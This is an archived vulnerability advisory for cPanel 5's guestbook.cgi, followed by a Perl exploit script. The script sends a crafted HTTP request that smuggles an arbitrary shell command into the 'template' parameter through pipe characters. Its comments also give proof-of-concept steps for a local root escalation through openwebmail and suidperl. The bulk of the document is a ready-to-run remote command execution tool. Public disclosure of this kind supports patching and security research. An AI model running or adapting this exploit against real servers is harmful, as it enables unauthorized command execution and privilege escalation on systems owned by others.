source: http://www.securityfocus.com/bid/6882/info
   
A remote command execution vulnerability has been discovered in the cPanel CGI Application. This issue occurs due to insufficient sanitization of externally supplied data to the 'guestbook.cgi' script.
   
An attacker may exploit this vulnerability to execute commands in the security context of the web server hosting the affected script.
   
This vulnerability has been reported to affect cPanel version 5, previous versions may also be affected.

#!/usr/bin/perl
#
# ------- start here -------
#
# Bug Founded by: pokleyzz
#
# Cpanel is web hosting control panel which allow client manage their web account through
# web interface. Most of the application are written in perl and  compiled to binary.
#
# Details
# =======
# There is multiple vurnerabilities in this package as describe below.
#
# 1) Remote command Execution in guestbook.cgi (/usr/local/cpanel/cgi-sys/guestbook.cgi)
#
# There is classic perl open function vulnerability in template variable which allow any
# user to read any file or run command  as valid system user which assign to specific url
# in apache configuration.
#
# 2) Local privileges escalation (root)
#
# Cpanel come with openwebmail packages as one of web base email reader which suid root.
# In the system with suid perl install perfectly (with suid mode turn on) local user may
# include their own perl script when running openwebmail script (oom) through suidperl.
#
# Openwebmail will append perl include path (@INC) through SCRIPT_FILENAME environment variable,
# then include some file when execute.
#
# /usr/local/cpanel/base/openwebmail/oom line 14
#
# if ( $ENV{'SCRIPT_FILENAME'} =~ m!^(.*?)/[\w\d\-]+\.pl! || $0 =~ m!^(.*?)/[\w\d\-]+\.pl! ) { $SCRIPT_DIR=$1; }
# if (!$SCRIPT_DIR) { print "Content-type: text/html\n\n\$SCRIPT_DIR not set in CGI script!\n"; exit 0; }
# push (@INC, $SCRIPT_DIR, ".");
# .
# .
# .
# require "openwebmail-shared.pl";
#
# proof of concept:
# i) Create file openwebmail-shared.pl contain perl script you want to execute.
# ii) Set SCRIPT_FILENAME point to full path of openwebmail-shared.pl file you just create.
# iii) exec oom script (ex: suidperl -T /usr/local/cpanel/base/openwebmail/oom )
#
# -------- cut here --------
#
# coded by cyzek. cyzek@efnet
# thanks for p0ng p0ng@brasnet.org

$url = $ARGV[0];
$cmd = $ARGV[1];

if(@ARGV != 2){
        print " jozc.pl - Cpanel 5 and below Remote Exploit by cyzek.\n";
        print " use %20 for spaces.\n";
        print " usage: $0 <host> <cmd>\n";
        exit;
}

use IO::Socket::INET;
$rem = IO::Socket::INET->new(
Proto       => "tcp",
PeerAddr    => $url,
PeerPort    => "80");

if ($rem) {
        print $rem "GET /cgi-sys/guestbook.cgi?user=cpanel&template=|$cmd| HTTP/1.0 \n\r\n\r\n\r";
        @resp = <$rem>;
}
print "@resp\n\n";